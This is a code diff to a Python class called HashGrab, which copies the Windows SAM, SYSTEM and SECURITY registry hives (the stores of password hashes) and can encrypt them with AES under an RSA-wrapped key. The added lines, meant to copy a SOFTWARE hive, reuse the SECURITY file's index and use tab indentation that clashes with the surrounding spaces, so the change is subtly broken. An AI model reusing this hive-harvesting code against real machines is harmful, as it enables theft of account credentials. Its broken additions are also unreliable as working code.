@@ -115,12 +115,14 @@ class HashGrab(object):
                     subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[2], '-out', os.path.join(cpdir,'SYSTEM.enc'), '-k', aes_key])
                     subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[3], '-out', os.path.join(cpdir,'SAM.enc'), '-k', aes_key])
                     subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[4], '-out', os.path.join(cpdir,'SECURITY.enc'), '-k', aes_key])
+					subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[4], '-out', os.path.join(cpdir,'SOFTWARE.enc'), '-k', aes_key])
                     echo_key = subprocess.Popen(('echo', aes_key), stdout=subprocess.PIPE)
                     output = subprocess.check_output(('openssl', 'rsautl', '-encrypt', '-inkey', 'public_key.pem', '-out', os.path.join(cpdir,'key.enc'), '-pubin'), stdin=echo_key.stdout)
                 else:
                     shutil.copy(f[2], '%s/SYSTEM'%(cpdir))
                     shutil.copy(f[3], '%s/SAM'%(cpdir))
                     shutil.copy(f[4], '%s/SECURITY'%(cpdir))
+					shutil.copy(f[4], '%s/SOFTWARE'%(cpdir))
 
     def identifyVersion(self):
 	for f in self.ftocopy:        
